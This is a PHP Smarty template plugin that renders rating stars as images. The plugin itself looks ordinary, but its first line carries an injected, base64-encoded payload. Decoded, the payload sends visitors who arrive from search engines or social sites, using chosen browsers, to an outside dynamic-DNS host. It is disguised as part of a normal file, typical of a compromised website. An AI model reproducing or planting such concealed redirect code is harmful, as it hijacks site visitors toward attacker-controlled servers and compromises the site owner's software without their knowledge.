<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/**
 * Smarty plugin
 * @package generic
 * @subpackage catalog
 */

/**
 * Smarty rating stars modifier plugin
 *
 * Type:     modifier<br>
 * Name:     rating_stars<br>
 * Purpose:  modify to star images rating display
 * @author   Pavel Chipiga <pchipiga@itera.ws>
 * @version  1.0
 * @param string - rating
 * @param num - output stars number
 * @param step - scale step >= 1
 * @param min - scale min value
 * @param max - scale max value
 * @return string
 */
 
function smarty_modifier_rating_stars($string, $num = 5, $step = 1, $max = 10, $min = 0, $alt = "", $extra = ""){
    global $tmpl;
    
    $scale = ($max - $min) / $step / $num;
    $value = intval($string);
    
    if (!$alt) $alt = ($value / $scale / $step)." Stars";
    $out = "";
    for ($i=0; $i < $num; $i++){        
        if ($i < floor($value/$scale/$step)) $star = $max;
        elseif ($i == floor($value/$scale/$step)) {            
            //if (($value % $scale) and ($value % $scale != $i)) $star = $value % $scale; //!!
            if ($value % $scale) $star = $value % $scale; //!!
            else $star = $min;
        } else {
            $star = $min;
        }
        //$out .= '<img src="{$smarty.const.WEBSITE_URL}{$resources}star'.$star.'.gif" alt="'.$alt.'" border="0" />';
        $out .= '<img src="{$resources}star'.$star.'.gif" alt="'.$alt.'" '.$extra.' border="0" />';
    }
    
    $out = $tmpl->fetch("string:".$out);
    return $out;
}     

/* vim: set expandtab: */

?>
